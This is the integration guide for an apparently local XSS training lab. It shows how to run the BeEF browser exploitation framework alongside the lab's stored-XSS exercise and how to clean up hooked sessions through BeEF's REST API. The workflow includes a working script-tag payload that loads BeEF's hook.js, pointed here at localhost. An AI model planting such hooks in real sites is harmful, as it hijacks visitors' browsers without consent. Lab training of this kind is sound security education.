# Optional BeEF Integration Guide

**XSS-Lab** includes built-in support for demonstrating the real-world impact of Stored XSS using the [Browser Exploitation Framework (BeEF)](https://beefproject.com/).

> [!NOTE]
> BeEF is completely optional. All core XSS laboratories and test suites operate independently without BeEF.

---

## 1. Network & Port Configuration

Because **XSS-Lab** binds to port `3000` (`http://127.0.0.1:3000`), your local BeEF instance must be configured on a separate port to prevent port collisions.

- **Recommended BeEF Port:** `3001`
- **BeEF Configuration (`config.yaml`):**
  ```yaml
  beef:
    http:
      host: "127.0.0.1"
      port: "3001"
  ```
- **BeEF URLs:**
  - Web UI Panel: `http://127.0.0.1:3001/ui/panel`
  - Hook Script: `http://127.0.0.1:3001/hook.js`
  - REST API: `http://127.0.0.1:3001/api/...`

---

## 2. Testing Workflow

1. Start your local BeEF server on port `3001`.
2. Open XSS-Lab at `http://127.0.0.1:3000/labs/stored`.
3. Submit a new comment containing the local hook:
   ```html
   <script src="http://127.0.0.1:3001/hook.js"></script>
   ```
4. Open another browser tab or private window to `http://127.0.0.1:3000/labs/stored`.
5. Check your BeEF Control Panel (`http://127.0.0.1:3001/ui/panel`) to observe the active hooked browser under **Online Browsers**.

---

## 3. Automated REST API Cleanup

During **Full Lab Restore** (`POST /api/lab/restore` or the **"🔄 Restore Entire Lab"** button):
1. XSS-Lab authenticates with the BeEF REST API (`POST /api/admin/login`).
2. Retrieves all online and offline hooked browsers (`GET /api/hooks`).
3. Identifies hooks belonging to XSS-Lab (`127.0.0.1:3000`).
4. Sends deletion commands (`GET /api/hooks/:session/delete`) to terminate and remove the session from BeEF's database.
5. If BeEF is unreachable or offline, the restore process skips BeEF cleanup safely and resets all local lab components.
